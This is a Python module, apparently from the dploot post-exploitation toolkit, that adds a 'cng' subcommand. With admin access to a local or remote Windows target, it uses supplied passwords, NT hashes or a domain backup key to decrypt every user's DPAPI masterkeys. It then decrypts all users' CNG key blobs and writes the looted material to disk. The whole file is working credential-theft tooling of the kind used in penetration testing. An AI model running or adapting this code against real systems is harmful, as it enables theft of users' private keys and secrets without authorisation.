import argparse
import logging
import sys
from typing import Callable, Tuple

from dploot.action.masterkeys import add_masterkeys_argument_group
from dploot.action import DPLootAction
from dploot.lib.target import Target, add_target_argument_group
from dploot.lib.utils import dump_looted_files_to_disk, handle_outputdir_option
from dploot.triage.cng import CngTriage
from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file


NAME = "cng"

class CngAction(DPLootAction):
    def __init__(self, options: argparse.Namespace) -> None:
        super().init_triage_user(options)

    def run(self) -> None:
        super().run()
        if self.conn.is_admin():
            if self.masterkeys is None:

                def masterkey_triage(masterkey):
                    masterkey.dump()

                masterkeytriage = MasterkeysTriage(
                    target=self.target,
                    conn=self.conn,
                    pvkbytes=self.pvkbytes,
                    nthashes=self.nthashes,
                    passwords=self.passwords,
                    per_masterkey_callback=masterkey_triage
                    if not self.options.quiet
                    else None,
                )
                logging.info("Triage ALL USERS masterkeys\n")
                self.masterkeys = masterkeytriage.triage_masterkeys()
                print()
                if self.outputdir is not None:
                    dump_looted_files_to_disk(self.outputdir, masterkeytriage.looted_files)

            def cng_callback(cng):
                if self.options.quiet:
                    cng.dump_quiet()
                else:
                    cng.dump()

            triage = CngTriage(
                target=self.target,
                conn=self.conn,
                masterkeys=self.masterkeys,
                per_cng_callback=cng_callback,
            )
            logging.info("Triage CNG files for ALL USERS\n")
            triage.triage_cng()
            if self.outputdir is not None:
                dump_looted_files_to_disk(self.outputdir, triage.looted_files)
        else:
            logging.info("Not an admin, exiting...")

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin
    

def entry(options: argparse.Namespace) -> None:
    a = CngAction(options)
    a.run()


def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:
    subparser = subparsers.add_parser(
        NAME, help="Dump users CNG files blob from local or remote target"
    )

    group = subparser.add_argument_group("cng options")

    group.add_argument(
        "-mkfile",
        action="store",
        help=("File containing {GUID}:SHA1 masterkeys mappings"),
    )

    add_masterkeys_argument_group(group)
    add_target_argument_group(subparser)

    return NAME, entry